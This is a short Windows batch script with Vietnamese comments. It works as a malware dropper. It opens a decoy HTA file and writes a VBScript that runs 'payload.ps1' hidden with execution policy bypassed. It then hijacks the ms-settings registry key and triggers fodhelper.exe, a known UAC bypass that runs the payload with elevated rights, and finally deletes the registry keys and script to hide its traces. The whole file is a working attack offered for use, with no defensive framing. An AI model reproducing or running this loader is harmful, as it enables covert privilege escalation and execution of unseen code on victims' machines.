@echo off
setlocal

set "S=%~dp0"
set "VBS=%TEMP%\r.vbs"

:: [1] Mo setup.hta lam decoy
if exist "%S%setup.hta" (
    start "" mshta.exe "%S%setup.hta"
)

:: [2] Tao VBScript proxy - chay payload.ps1 hoan toan an
echo Set o=CreateObject("WScript.Shell") > "%VBS%"
echo o.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File ""%S%payload.ps1""",0,False >> "%VBS%"

:: [3] Xoa registry cu
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1

:: [4] Ghi registry - wscript proxy
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /ve /t REG_SZ /d "wscript.exe \"%VBS%\"" /f >nul 2>&1
reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1

:: [5] Trigger fodhelper
start /b fodhelper.exe

:: [6] Cho fodhelper doc registry
timeout /t 3 /nobreak >nul

:: [7] Don sach
reg delete "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
del /F /Q "%VBS%" >nul 2>&1

endlocal
exit /b 0